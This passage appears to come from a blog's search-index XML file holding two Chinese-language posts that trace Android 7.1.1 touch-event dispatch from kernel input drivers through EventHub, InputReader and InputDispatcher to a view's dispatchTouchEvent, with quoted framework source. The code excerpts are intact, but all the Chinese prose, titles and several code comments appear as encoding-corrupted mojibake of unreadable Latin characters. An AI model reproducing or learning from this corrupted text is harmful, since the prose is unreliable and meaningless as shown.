&#123; ensureTouchMode(true); &#125; // Offset the scroll position. if (mCurScrollY != 0) &#123; event.offsetLocation(0, mCurScrollY); &#125; // Remember the touch position for possible drag-initiation. if (event.isTouchEvent()) &#123; mLastTouchPoint.x = event.getRawX(); mLastTouchPoint.y = event.getRawY(); mLastTouchSource = event.getSource(); &#125; return FORWARD;&#125; å¯¹äº‹ä»¶è¿›è¡Œå¤„ç†ä»¥åŽç»§ç»­è¿›å…¥ä¸‹ä¸€é˜¶æ®µã€‚ NativePostImeInputStage12345678@Overrideprotected int onProcess(QueuedInputEvent q) &#123; if (mInputQueue != null) &#123; mInputQueue.sendInputEvent(q.mEvent, q, false, this); return DEFER; &#125; return FORWARD;&#125; å¦‚æžœæœ‰äº‹ä»¶ç­‰å¾…è¢«å¤„ç†ï¼Œåˆ™æŽ¨è¿Ÿå½“å‰äº‹ä»¶çš„å¤„ç†ï¼ˆå®žçŽ°å¼‚æ­¥ï¼‰ã€‚å¦åˆ™ç›´æŽ¥è¿›å…¥ä¸‹ä¸€ä¸ªé˜¶æ®µï¼š ViewPostImeInputStage123456789101112131415@Overrideprotected int onProcess(QueuedInputEvent q) &#123; if (q.mEvent instanceof KeyEvent) &#123; return processKeyEvent(q); &#125; else &#123; final int source = q.mEvent.getSource(); if ((source &amp; InputDevice.SOURCE_CLASS_POINTER) != 0) &#123; return processPointerEvent(q); &#125; else if ((source &amp; InputDevice.SOURCE_CLASS_TRACKBALL) != 0) &#123; return processTrackballEvent(q); &#125; else &#123; return processGenericMotionEvent(q); &#125; &#125;&#125; ç¬¬7è¡Œåˆ¤æ–­æˆç«‹ï¼Œè°ƒç”¨processPointerEvent()æ–¹æ³•ï¼š 123456789101112private int processPointerEvent(QueuedInputEvent q) &#123; final MotionEvent event = (MotionEvent)q.mEvent; mAttachInfo.mUnbufferedDispatchRequested = false; final View eventTarget = (event.isFromSource(InputDevice.SOURCE_MOUSE) &amp;&amp; mCapturingView != null) ? mCapturingView : mView; mAttachInfo.mHandlingPointerEvent = true; boolean handled = eventTarget.dispatchPointerEvent(event); ... return handled ? FINISH_HANDLED : FORWARD;&#125; åˆ¤æ–­ç›®æ ‡æ˜¯å¦æ˜¯mCapturingViewï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç›®æ ‡å°±æ˜¯mViewï¼ˆä¹Ÿå°±æ˜¯å½“å‰Windowçš„æ ¹Viewä¹Ÿå°±æ˜¯DecorViewï¼‰ï¼Œç„¶åŽè°ƒç”¨äº†å®ƒçš„dispatchPointerEvent()æ–¹æ³•ï¼ˆç»§æ‰¿è‡ªViewï¼‰ï¼š 1234567public final boolean dispatchPointerEvent(MotionEvent event) &#123; if (event.isTouchEvent()) &#123; return dispatchTouchEvent(event); &#125; else &#123; return dispatchGenericMotionEvent(event); &#125;&#125; åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬ç»ˆäºŽçœ‹åˆ°äº†ç†Ÿæ‚‰çš„dispatchTouchEvent()æ–¹æ³•ï¼ŒåŒæ—¶è¿™ä¹Ÿæ˜¯ä¸€èˆ¬è§¦æ‘¸äº‹ä»¶åˆ†å‘æœºåˆ¶åˆ†æžçš„å¼€å§‹ã€‚ å°ç»“çŽ°åœ¨ï¼Œæˆ‘ä»¬äº†è§£äº†ä»ŽåŽŸå§‹äº‹ä»¶çš„äº§ç”Ÿåœ°ç‚¹åˆ°æŸä¸ªåº”ç”¨UIçº¿ç¨‹äº‹ä»¶å¾ªçŽ¯å†åˆ°æ ¹viewçš„dispatchTouchEvent()çš„æ•´ä¸ªæµç¨‹ã€‚åˆ†æžè¿™ä¸ªè¿‡ç¨‹è¿˜æ˜¯è¦å†æ¬¡æ„Ÿè°¢Gityuançš„åšå®¢ï¼Œè¿™ä¸ªè¿‡ç¨‹æ‰¾å¾—åˆ°çš„èµ„æ–™åªæœ‰ä»–çš„æ–‡ç« ï¼Œçœäº†è®¸å¤šåŠŸå¤«ã€‚ ä¸‹ä¸€ç¯‡æ–‡ç« å¼€å§‹å°±è¦è®²è§£ä¸€èˆ¬è§¦æ‘¸äº‹ä»¶åˆ†å‘åˆ†æžçš„è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯å‚è€ƒèµ„æ–™æ¯”è¾ƒå¤šçš„éƒ¨åˆ†ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android è§¦æ‘¸äº‹ä»¶åˆ†å‘æœºåˆ¶ï¼ˆä¸€ï¼‰ä»Žå†…æ ¸åˆ°åº”ç”¨ ä¸€åˆ‡çš„å¼€å§‹]]></title>
    <url>%2F2017%2F09%2F14%2Fandroid_view_event_1%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢æœ¬æ–‡åŸºäºŽAndroid 7.1.1 (API 25)çš„æºç åˆ†æžç¼–å†™ å®‰å“æ˜¯åŸºäºŽè§¦æ‘¸æ“ä½œè¿›è¡Œäº¤äº’çš„ç³»ç»Ÿï¼Œå‡ ä¹Žæ‰€æœ‰çš„æ“ä½œéƒ½ç”±å¯¹å±å¹•çš„ä¸€æ¬¡æ¬¡è§¦æ‘¸å®Œæˆï¼Œå¦‚ä½•æ­£ç¡®å¤„ç†è§¦æ‘¸äº‹ä»¶å…³ä¹Žæ•´ä¸ªåº”ç”¨çš„æ“ä½œä½“éªŒã€‚å› æ­¤å®‰å“å¯¹äºŽè§¦æ‘¸äº‹ä»¶çš„åˆ†å‘ä¸Žå¤„ç†æœºåˆ¶ä¹Ÿæ˜¯æˆ‘ä»¬å­¦ä¹ å®‰å“å¼€å‘çš„é‡ä¸­ä¹‹é‡ã€‚åŒæ—¶å‡ ä¹Žæ¯ä¸€ä¸ªå®‰å“æŠ€æœ¯åšå®¢ä¸­éƒ½ä¼šå¯¹è§¦æ‘¸åˆ†å‘æœºåˆ¶è¿™ä¸€å—è¿›è¡Œè¯¦è§£ï¼Œä¾‹å¦‚æ¯”è¾ƒæ—©æœŸä¹Ÿæ˜¯æœ€ä¸ºå‡ºåçš„éƒ­éœ–ï¼ˆã€Šç¬¬ä¸€è¡Œä»£ç ã€‹çš„ä½œè€…ï¼‰ã€‚çŽ°åœ¨ç½‘ç»œä¸Šå¯¹äºŽè¿™ä¸€å—çš„åˆ†æžä¹Ÿå·²ç»æ¯”è¾ƒè¯¦å°½äº†ï¼ŒåŸºæœ¬ä¸Šä¸€ç¯‡åšå®¢ä¸­é—æ¼çš„éƒ¨åˆ†éƒ½å¯ä»¥åœ¨å…¶ä»–åšå®¢ä¸­æ‰¾åˆ°ç­”æ¡ˆã€‚ ä½†æ˜¯æ— è®ºåˆ«äººçš„æ–‡ç« è®²å¾—å¤šå¥½ï¼Œå¤šä¹ˆè¯¦ç»†ï¼Œæˆ‘ä»¬éƒ½éœ€è¦è‡ªå·±åŽ»æ‰“å¼€æºç ä»”ç»†åˆ†æžå¥½å¥½ä½“ä¼šï¼Œä¸€æ˜¯è¿™æ ·ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„è¿‡ç¨‹ä¸ç»åŽ†è‡ªå·±çš„æ€è€ƒå¾ˆéš¾å®Œå…¨ç†è§£ï¼ŒäºŒæ˜¯éšç€apiç‰ˆæœ¬çš„æŽ¨è¿›è¿™éƒ¨åˆ†æºç ä¹Ÿä¼šå‘ç”Ÿå¾ˆå¤šå˜åŒ–ï¼Œè™½ç„¶å¤§è‡´æ€è·¯ç›¸åŒï¼Œä½†æ˜¯æŽ¥è§¦åˆ°æ–°çš„å†…å®¹æ€»æ˜¯ä¸€ä»¶å¥½äº‹ã€‚ è¿™ä¹Ÿå°±æ˜¯æˆ‘å†™è¿™ç¯‡åšæ–‡çš„åŽŸå› ï¼šè®°å½•è‡ªå·±æ€è€ƒä¸Žåˆ†æžçš„è¿‡ç¨‹ã€‚ è§¦æ‘¸äº‹ä»¶çš„æ¥æºè¿™éƒ¨åˆ†çš„å†…å®¹ä¸Žå®‰å“æœ¬èº«æ— å…³ï¼Œä»£ç å¤§éƒ¨åˆ†ä¹Ÿéƒ½æ˜¯C++å®žçŽ°çš„ï¼Œä¸­é—´çš„å¤§éƒ¨åˆ†å†…å®¹æ¥è‡ªäºŽæˆ‘å¯¹ç›¸å…³èµ„æ–™çš„æ€»ç»“ï¼Œä¸åœ¨ä»£ç å±‚é¢è¿›è¡Œè¯¦ç»†è§£é‡Šï¼Œåªæ˜¯è¯´æ˜Žä¸€ä¸ªæµç¨‹ï¼ŒåŒæ—¶ä¹Ÿä¼šå¯¹ä»£ç è¿›è¡Œå¤§éƒ¨åˆ†çš„åˆ å‡ï¼Œåªå…³æ³¨æœ€æ ¸å¿ƒçš„é‚£éƒ¨åˆ†ã€‚ ä»Žç¡¬ä»¶åˆ°å†…æ ¸æˆ‘ä»¬ä»Žå¤´å¼€å§‹ï¼Œä»Žè§¦æ‘¸äº‹ä»¶æœ€åˆæœ€åˆçš„æ¥æºå¼€å§‹ï¼Œæˆ‘ä»¬çŸ¥é“å†…æ ¸æ˜¯ä»¥å¤„ç†ä¸­æ–­çš„æ–¹å¼å¤„ç†ç”¨æˆ·çš„è¾“å…¥çš„ï¼Œè§¦æ‘¸äº‹ä»¶ä½œä¸ºä¸€ç§ç‰¹æ®Šçš„è¾“å…¥äº‹ä»¶ï¼Œè‡ªç„¶ä¹Ÿéœ€è¦è¿™ç§æ–¹å¼è¿›è¡Œå¤„ç†ï¼Œåªä¸è¿‡è§¦æ‘¸äº‹ä»¶çš„æä¾›çš„ä¿¡æ¯è¦ç¨å¾®å¤æ‚ä¸€äº›ã€‚ è§¦æ‘¸äº‹ä»¶æ¥è‡ªäºŽæˆ‘ä»¬å¯¹ç¡¬ä»¶çš„æ“ä½œï¼Œæœ€åˆçš„æ¥æºå½“ç„¶æ˜¯ç¡¬ä»¶å¼•èµ·çš„ä¸­æ–­ã€‚è€Œå¤„ç†ç‰¹å®šä¸­æ–­çš„ä»£ç åˆ™æ¥è‡ªäºŽå¯¹åº”ç¡¬ä»¶çš„é©±åŠ¨ï¼š å›¾ç‰‡æ¥æºï¼ˆä»¥ä¸‹ç³»åˆ—å›¾ç‰‡æ¥æºç›¸åŒï¼Œä¸ä½œæ ‡æ³¨ï¼‰ å½“ä¸€ä¸ªè¾“å…¥è®¾å¤‡çš„é©±åŠ¨æ¨¡å—è¢«é¦–æ¬¡è½½å…¥å†…æ ¸çš„æ—¶å€™ï¼Œä¼šæ£€æµ‹å®ƒåº”è¯¥ç®¡ç†çš„ç¡¬ä»¶è®¾å¤‡ï¼Œå¦‚æžœæ£€æµ‹æˆåŠŸï¼Œé©±åŠ¨æ¨¡å—ä¼šè°ƒç”¨include/linux/input.hä¸­çš„input_register_device(â€¦)å‡½æ•°è®¾ç½®ä¸€ä¸ª/dev/input/eventXï¼ˆXä¸ºæ•´æ•°ï¼‰æ¥ä»£è¡¨è¿™ä¸ªè¾“å…¥è®¾å¤‡ã€‚é©±åŠ¨æ¨¡å—åŒæ—¶ä¹Ÿä¼šé€šè¿‡include/linux/interrupt.hçš„request_irq(â€¦)å‡½æ•°æ³¨å†Œä¸€ä¸ªå‡½æ•°åŽ»å¤„ç†è¿™ä¸ªç¡¬ä»¶å¼•å‘çš„ä¸­æ–­ï¼Œæ³¨å†ŒæˆåŠŸä»¥åŽï¼Œå½“è®¾å¤‡å› ç”¨æˆ·äº¤äº’è€Œäº§ç”Ÿä¸­æ–­çš„æ—¶å€™å°±ä¼šäº¤ç»™å¯¹åº”çš„é©±åŠ¨æ¨¡å—è¿›è¡Œå¤„ç†ã€‚ é©±åŠ¨æ¨¡å—å¤„ç†çš„ç»†èŠ‚å„ä¸ç›¸åŒï¼Œä½†æœ€ç»ˆéƒ½ä¼šå°†æ•°æ®å¤„ç†åŽå­˜æ”¾è¿›å¯¹åº”çš„/dev/input/eventXæ–‡ä»¶ä¸­ã€‚ ç³»ç»Ÿå¯¹è§¦æ‘¸äº‹ä»¶çš„å¤„ç†çŽ°åœ¨é©±åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬æ”¶é›†å¥½äº†åŽŸå§‹çš„è¾“å…¥ä¿¡æ¯å¹¶å­˜æ”¾åœ¨äº†eventXæ–‡ä»¶ä¸­ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ç³»ç»Ÿå¯¹äºŽè¿™ä¸ªæ–‡ä»¶çš„å¤„ç†å¹¶å‘é€åˆ°åº”ç”¨å±‚é¢ã€‚ å¯ä»¥çœ‹åˆ°ç³»ç»ŸæœåŠ¡å……å½“äº†ä»Žå†…æ ¸åˆ°åº”ç”¨çš„æ¡¥æ¢ã€‚ ç³»ç»ŸæœåŠ¡ç”±ä¸‰ä¸ªç»„ä»¶æž„æˆï¼šEventHubã€InputReaderã€InputDispatcherï¼Œå…³äºŽå®ƒä»¬çš„ä½œç”¨çš„è¯¦ç»†åˆ†æžåœ¨ï¼š http://gityuan.com/2016/12/31/input-ipc/ ä¸‹é¢å¯¹è¿™ä¸ªè¿‡ç¨‹ä½œç®€å•ä»‹ç»ã€‚ EventHubæ–‡ä»¶åœ¨frameworks/native/services/inputflinger/EventHub.cpp å®ƒçš„ä½œç”¨æ˜¯ç›‘å¬ã€è¯»å–/dev/inputç›®å½•ä¸‹äº§ç”Ÿçš„æ–°äº‹ä»¶ï¼Œå¹¶å°è£…æˆRawEventç»“æž„ä½“ä¾›InputReaderä½¿ç”¨ã€‚ InputReaderæ–‡ä»¶åœ¨frameworks/native/services/inputflinger/InputReader.cpp InputReaderè¿è¡Œåœ¨ä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹ä¸­ï¼Œè¿™ä¸ªè¿›ç¨‹ç”±InputManagerServiceçš„åˆå§‹åŒ–è€Œæ–°å»ºï¼Œå…·ä½“å†…å®¹è¯·è§ï¼š http://gityuan.com/2016/12/10/input-manager/ å®ƒä¼šåœ¨å†…éƒ¨ä¸æ–­åœ°å¾ªçŽ¯è°ƒç”¨loopOnce()æ–¹æ³•æ¥ä¸æ–­è¯»å–äº‹ä»¶ï¼š 123456789void InputReader::loopOnce() &#123; ... size_t count = mEventHub-&gt;getEvents(timeoutMillis, mEventBuffer, EVENT_BUFFER_SIZE); ... if (count) &#123; processEventsLocked(mEventBuffer, count); &#125; ...&#125; ç¬¬3è¡Œè°ƒç”¨äº†mEventHubçš„getEvent()æ–¹æ³•ä»¥èŽ·å–äº‹ä»¶ã€‚ ç¬¬6è¡Œè°ƒç”¨processEventLocked()æ–¹æ³•æ¥å¤„ç†äº‹ä»¶ï¼Œç»è¿‡ä¸€ç³»åˆ—åˆ¤æ–­ä¹‹åŽï¼Œä¼šæ‰§è¡Œè¿™è¡Œä»£ç ï¼š 1device-&gt;process(rawEvents, count); processå‡½æ•°ä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š 12InputMapper* mapper = mMappers[i];mapper-&gt;process(rawEvent); ä½¿ç”¨mapperåŽ»å¤„ç†rawEventï¼Œä¸åŒçš„è¾“å…¥äº‹ä»¶ç±»åž‹ä¼šç”±ä¸åŒçš„mapperåŽ»å¤„ç†ï¼Œä»¥å¤„ç†è§¦æ‘¸äº‹ä»¶çš„TouchInputMapperä¸ºä¾‹ï¼š åªçœ‹æ ¸å¿ƒè°ƒç”¨çš„è¯ï¼Œä¼šä¾æ¬¡è°ƒç”¨å¦‚ä¸‹å‡½æ•°ï¼š 1234567891011void TouchInputMapper::process(const RawEvent* rawEvent)void TouchInputMapper::sync(nsecs_t when)void TouchInputMapper::processRawTouches(bool timeout)void TouchInputMapper::cookAndDispatch(nsecs_t when)void TouchInputMapper::dispatchTouches(nsecs_t when, uint32_t policyFlags) void TouchInputMapper::dispatchMotion(nsecs_t when, uint32_t policyFlags, uint32_t source, int32_t action, int32_t actionButton, int32_t flags, int32_t metaState, int32_t buttonState, int32_t edgeFlags, const PointerProperties* properties, const PointerCoords* coords, const uint32_t* idToIndex, BitSet32 idBits, int32_t changedId, float xPrecision, float yPrecision, nsecs_t downTime) åœ¨æœ€ç»ˆçš„dispatchMotion()å‡½æ•°ä¸­æ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š 12345NotifyMotionArgs args(when, getDeviceId(), source, policyFlags, action, actionButton, flags, metaState, buttonState, edgeFlags, mViewport.displayId, pointerCount, pointerProperties, pointerCoords, xPrecision, yPrecision, downTime);getListener()-&gt;notifyMotion(&amp;args); å¯ä»¥çœ‹åˆ°äº‹ä»¶å·²ç»è¢«å¤„ç†æˆäº†ä¸€ä¸ªargsï¼Œç„¶åŽè°ƒç”¨getListener()ï¼š 123InputListenerInterface* InputReader::ContextImpl::getListener() &#123; return mReader-&gt;mQueuedListener.get();&#125; èŽ·å–çš„æ˜¯mQueuedListenerï¼ŒæŸ¥çœ‹notifyMotion()å‡½æ•°ï¼š 123void QueuedInputListener::notifyMotion(const NotifyMotionArgs* args) &#123; mArgsQueue.push(new NotifyMotionArgs(*args));&#125; è¿™é‡Œçš„NotifyMotionArgs()åªæ˜¯å¯¹äº‹ä»¶è¿›è¡Œäº†ä¸€æ¬¡å†å°è£…ã€‚å¯ä»¥çœ‹åˆ°è¿™ä¸ªargsæœ€ç»ˆè¿›å…¥äº†QueuedInputListenerçš„mArgsQueueä¸­ã€‚ æˆ‘ä»¬å†å›žåˆ°InputReaderçš„loopOnce()å‡½æ•°ä¸­ï¼Œå‡½æ•°åœ¨æ‰§è¡Œå®Œä¸Šè¿°è°ƒç”¨åˆ°è¾¾æœ€åŽä¸€è¡Œæ—¶ï¼š 1mQueuedListener-&gt;flush(); è°ƒç”¨flush()å‡½æ•°ï¼š 123456789void QueuedInputListener::flush() &#123; size_t count = mArgsQueue.size(); for (size_t i = 0; i &lt; count; i++) &#123; NotifyArgs* args = mArgsQueue[i]; args-&gt;notify(mInnerListener); delete args; &#125; mArgsQueue.clear();&#125; è°ƒç”¨äº†å„argsçš„notify()å‡½æ•°ï¼š 123void NotifyMotionArgs::notify(const sp&lt;InputListenerInterface&gt;&amp; listener) const &#123; listener-&gt;notifyMotion(this);&#125; æ³¨æ„è¿™é‡Œçš„listenerä¼ å…¥çš„æ˜¯mInnerListenerï¼Œå®ƒæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ 123QueuedInputListener::QueuedInputListener(const sp&lt;InputListenerInterface&gt;&amp; innerListener) : mInnerListener(innerListener) &#123;&#125; åœ¨æž„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ã€‚ 12345678910111213141516InputReader::InputReader(const sp&lt;EventHubInterface&gt;&amp; eventHub, const sp&lt;InputReaderPolicyInterface&gt;&amp; policy, const sp&lt;InputListenerInterface&gt;&amp; listener) : mContext(this), mEventHub(eventHub), mPolicy(policy), mGlobalMetaState(0), mGeneration(1), mDisableVirtualKeysTimeout(LLONG_MIN), mNextTimeout(LLONG_MAX), mConfigurationChangesToRefresh(0) &#123; mQueuedListener = new QueuedInputListener(listener); &#123; // acquire lock AutoMutex _l(mLock); refreshConfigurationLocked(0); updateGlobalMetaStateLocked(); &#125; // release lock&#125; åœ¨InputReaderæž„é€ å‡½æ•°ä¸­æž„é€ QueuedInputListenerã€‚ è€ŒInputReaderæ˜¯ç”±InputManagerç±»è¿›è¡Œåˆå§‹åŒ–çš„ï¼ˆçº¿ç¨‹çš„æ–°å»ºä¹Ÿåœ¨è¿™ä¸ªç±»ä¸­ï¼‰ï¼š 12345678InputManager::InputManager( const sp&lt;EventHubInterface&gt;&amp; eventHub, const sp&lt;InputReaderPolicyInterface&gt;&amp; readerPolicy, const sp&lt;InputDispatcherPolicyInterface&gt;&amp; dispatcherPolicy) &#123; mDispatcher = new InputDispatcher(dispatcherPolicy); mReader = new InputReader(eventHub, readerPolicy, mDispatcher); initialize();&#125; æ³¨æ„åˆ°ç¬¬6è¡Œä¸­ï¼Œä¼ å…¥çš„listeneræ­£æ˜¯mDispatcherä¹Ÿå°±æ˜¯InputDispatcherå¯¹è±¡ã€‚ æ‰€ä»¥è¯´ï¼Œlistener-&gt;notifyMotion(this);è°ƒç”¨çš„æ˜¯InputDispatcherçš„notifyMotion()å‡½æ•°ï¼Œè‡³æ­¤ï¼ŒInputReaderçš„å·¥ä½œå·²ç»å®Œæˆï¼Œå®ƒä»ŽEventHubä¸­å¾ªçŽ¯è¯»å–åœ°rawEventäº‹ä»¶ï¼Œå¹¶å¤„ç†æˆargså†é€šçŸ¥InputDispatcherå¯¹äº‹ä»¶è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†å‘å¤„ç†ã€‚ InputDispatcheræˆ‘ä»¬ç›´æŽ¥æ¥åˆ°InputDispatcherçš„æºç ï¼Œè·¯å¾„ï¼šframeworks/native/services/inputflinger/InputDispatcher.cpp ä¸Šé¢è¯´åˆ°æœ€ç»ˆè°ƒç”¨äº†InputDispatcherçš„notifyMotionæ–¹æ³•ï¼š 12345678910111213MotionEvent event;event.initialize(args-&gt;deviceId, args-&gt;source, args-&gt;action, args-&gt;actionButton,args-&gt;flags, args-&gt;edgeFlags, args-&gt;metaState, args-&gt;buttonState, 0, 0, args-&gt;xPrecision, args-&gt;yPrecision, args-&gt;downTime, args-&gt;eventTime, args-&gt;pointerCount, args-&gt;pointerProperties, args-&gt;pointerCoords);...// Just enqueue a new motion event.MotionEntry* newEntry = new MotionEntry(args-&gt;eventTime, args-&gt;deviceId, args-&gt;source, policyFlags, args-&gt;action, args-&gt;actionButton, args-&gt;flags, args-&gt;metaState, args-&gt;buttonState, args-&gt;edgeFlags, args-&gt;xPrecision, args-&gt;yPrecision, args-&gt;downTime, args-&gt;displayId, args-&gt;pointerCount, args-&gt;pointerProperties, args-&gt;pointerCoords, 0, 0);needWake = enqueueInboundEventLocked(newEntry); é‡Œé¢æ–°å»ºå¹¶åˆå§‹åŒ–äº†ä¸€ä¸ªMotionEventï¼Œç„¶åŽåŒ…è£…æˆä¸€ä¸ªEntryï¼Œç„¶åŽè°ƒç”¨enqueueInboundEventLocked()å‡½æ•°ï¼š 1mInboundQueue.enqueueAtTail(entry); åœ¨enqueueInboundEventLocked()å‡½æ•°ä¸­å°†è¿™ä¸ªentryæ’å…¥åˆ°äº†mInboundQueueè¿™ä¸ªInputDispatcherç»´æŠ¤çš„æˆå‘˜å˜é‡ä¸­ã€‚ åˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°äº‹ä»¶ç»è¿‡ä¸€ç³»åˆ—çš„å¤„ç†å’Œä¼ é€’ä»¥åŽæœ€ç»ˆä½œä¸ºä¸€ä¸ªentryæ’å…¥åˆ°äº†InputDispatcherçš„é˜Ÿåˆ—ä¸­ç­‰å¾…è¢«è¿›ä¸€æ­¥åˆ†å‘ã€‚ è¿™ä¸ªåˆ†å‘è¿‡ç¨‹æ˜¯åœ¨å“ªé‡Œè¿›è¡Œçš„å‘¢ï¼Ÿ InputDispatcherçº¿ç¨‹çš„threadLoop()å‡½æ•°ä¼šè¢«ä¸æ–­è°ƒç”¨ï¼š 1234bool InputDispatcherThread::threadLoop() &#123; mDispatcher-&gt;dispatchOnce(); return true;&#125; åœ¨dispatcherOnce()ä¸­ï¼š 123if (!haveCommandsLocked()) &#123; dispatchOnceInnerLocked(&amp;nextWakeupTime);&#125; åœ¨æ²¡æœ‰å¾…æ‰§è¡Œçš„æŒ‡ä»¤æ—¶æ‰§è¡ŒdispatchOnceInnerLocked()å‡½æ•°ï¼š 1mPendingEvent = mInboundQueue.dequeueAtHead(); è¿™ä¸ªå‡½æ•°ä¸­è¿˜åŒ…å«äº†ANRçš„åˆ¤æ–­ä¿¡æ¯ï¼Œå…³äºŽANRçš„éƒ¨åˆ†ä¹‹åŽå†å¦å¼€åšæ–‡è®²ã€‚ è‹¥mInboundQueueä¸ä¸ºç©ºï¼Œåˆ™ä»Žä¸­å–å‡ºå¤´éƒ¨çš„pendingEventã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354switch (mPendingEvent-&gt;type) &#123;case EventEntry::TYPE_CONFIGURATION_CHANGED: &#123; ConfigurationChangedEntry *typedEntry = static_cast&lt;ConfigurationChangedEntry *&gt;(mPendingEvent); done = dispatchConfigurationChangedLocked(currentTime, typedEntry); dropReason = DROP_REASON_NOT_DROPPED; // configuration changes are never dropped break;&#125;case EventEntry::TYPE_DEVICE_RESET: &#123; DeviceResetEntry *typedEntry = static_cast&lt;DeviceResetEntry *&gt;(mPendingEvent); done = dispatchDeviceResetLocked(currentTime, typedEntry); dropReason = DROP_REASON_NOT_DROPPED; // device resets are never dropped break;&#125;case EventEntry::TYPE_KEY: &#123; KeyEntry *typedEntry = static_cast&lt;KeyEntry *&gt;(mPendingEvent); if (isAppSwitchDue) &#123; if (isAppSwitchKeyEventLocked(typedEntry)) &#123; resetPendingAppSwitchLocked(true); isAppSwitchDue = false; &#125; else if (dropReason == DROP_REASON_NOT_DROPPED) &#123; dropReason = DROP_REASON_APP_SWITCH; &#125; &#125; if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isStaleEventLocked(currentTime, typedEntry)) &#123; dropReason = DROP_REASON_STALE; &#125; if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; mNextUnblockedEvent) &#123; dropReason = DROP_REASON_BLOCKED; &#125; done = dispatchKeyLocked(currentTime, typedEntry, &amp;dropReason, nextWakeupTime); break;&#125;case EventEntry::TYPE_MOTION: &#123; MotionEntry *typedEntry = static_cast&lt;MotionEntry *&gt;(mPendingEvent); if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isAppSwitchDue) &#123; dropReason = DROP_REASON_APP_SWITCH; &#125; if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isStaleEventLocked(currentTime, typedEntry)) &#123; dropReason = DROP_REASON_STALE; &#125; if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; mNextUnblockedEvent) &#123; dropReason = DROP_REASON_BLOCKED; &#125; done = dispatchMotionLocked(currentTime, typedEntry, &amp;dropReason, nextWakeupTime); break;&#125;default: ALOG_ASSERT(false); break;&#125; ä¸‹é¢å¯¹å–å‡ºçš„mPendingEventçš„ç±»åž‹è¿›è¡Œåˆ¤æ–­ï¼Œæ ¹æ®ä¸åŒçš„ç±»åž‹ä¿¡æ¯æŠŠå®ƒè½¬æ¢å›žåŽŸæ¥çš„Entryä¿¡æ¯ï¼Œç„¶åŽè°ƒç”¨ç›¸åº”çš„åˆ†å‘æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜æ˜¯é¡ºç€è§¦æ‘¸äº‹ä»¶åˆ†å‘è¿™æ¡è·¯ç»§ç»­å‘ä¸‹èµ°ï¼Œè°ƒç”¨äº†bool InputDispatcher::dispatchMotionLocked()å‡½æ•°ï¼š 12345678910int32_t injectionResult;if (isPointerEvent) &#123;// Pointer event. (eg. touchscreen) injectionResult = findTouchedWindowTargetsLocked(currentTime, entry, inputTargets, nextWakeupTime, &amp;conflictingPointerActions);&#125; else &#123;// Non touch event. (eg. trackball) injectionResult = findFocusedWindowTargetsLocked(currentTime, entry, inputTargets, nextWakeupTime);&#125; å¯¹è§¦æ‘¸æˆ–è½¨è¿¹çƒäº‹ä»¶åšä¸€ä¸ªåˆ¤æ–­ï¼Œå†è°ƒç”¨findTouchedWindowTargesLocked()å‡½æ•°ï¼š 12345int32_t pointerIndex = getMotionEventActionPointerIndex(action);int32_t x = int32_t(entry-&gt;pointerCoords[pointerIndex]. getAxisValue(AMOTION_EVENT_AXIS_X));int32_t y = int32_t(entry-&gt;pointerCoords[pointerIndex]. getAxisValue(AMOTION_EVENT_AXIS_Y)); åœ¨è¿™é‡Œå–å‡ºäº†entryé‡Œé¢çš„pointerIndexä¸Žè§¦æ‘¸ç‚¹åæ ‡çš„x yå€¼ã€‚ 12345678910111213141516171819202122232425262728293031323334// ä»Žå‰å‘åŽéåŽ†æ‰€æœ‰çš„windowä»¥æ‰¾å‡ºè§¦æ‘¸çš„windowsize_t numWindows = mWindowHandles.size();for (size_t i = 0; i &lt; numWindows; i++) &#123; sp&lt;InputWindowHandle&gt; windowHandle = mWindowHandles.itemAt(i); const InputWindowInfo *windowInfo = windowHandle-&gt;getInfo(); if (windowInfo-&gt;displayId != displayId) &#123; continue; // é”™è¯¯çš„window(displayIdä¸åŒ¹é…) &#125; int32_t flags = windowInfo-&gt;layoutParamsFlags; if (windowInfo-&gt;visible) &#123; // å¦‚æžœwindowå¯è§ if (!(flags &amp; InputWindowInfo::FLAG_NOT_TOUCHABLE)) &#123; isTouchModal = (flags &amp; (InputWindowInfo::FLAG_NOT_FOCUSABLE | InputWindowInfo::FLAG_NOT_TOUCH_MODAL)) == 0; // windowå¯ä»¥è¢«è§¦æ‘¸ if (isTouchModal || windowInfo-&gt;touchableRegionContainsPoint(x, y)) &#123; // (x,y)åœ¨windowå†…å¯è§¦æ‘¸åŒºåŸŸå†… newTouchedWindowHandle = windowHandle; break; // æ‰¾åˆ°è§¦æ‘¸çš„windowï¼Œä¿å­˜åœ¨newTouchedWindowHandleä¸­ &#125; &#125; // åˆ¤æ–­æ˜¯å¦è§¦æ‘¸windowä¹‹å¤–çš„åŒºåŸŸ if (maskedAction == AMOTION_EVENT_ACTION_DOWN &amp;&amp; (flags &amp; InputWindowInfo::FLAG_WATCH_OUTSIDE_TOUCH)) &#123; int32_t outsideTargetFlags = InputTarget::FLAG_DISPATCH_AS_OUTSIDE; if (isWindowObscuredAtPointLocked(windowHandle, x, y)) &#123; outsideTargetFlags |= InputTarget::FLAG_WINDOW_IS_OBSCURED; &#125; else if (isWindowObscuredLocked(windowHandle)) &#123; outsideTargetFlags |= InputTarget::FLAG_WINDOW_IS_PARTIALLY_OBSCURED; &#125; 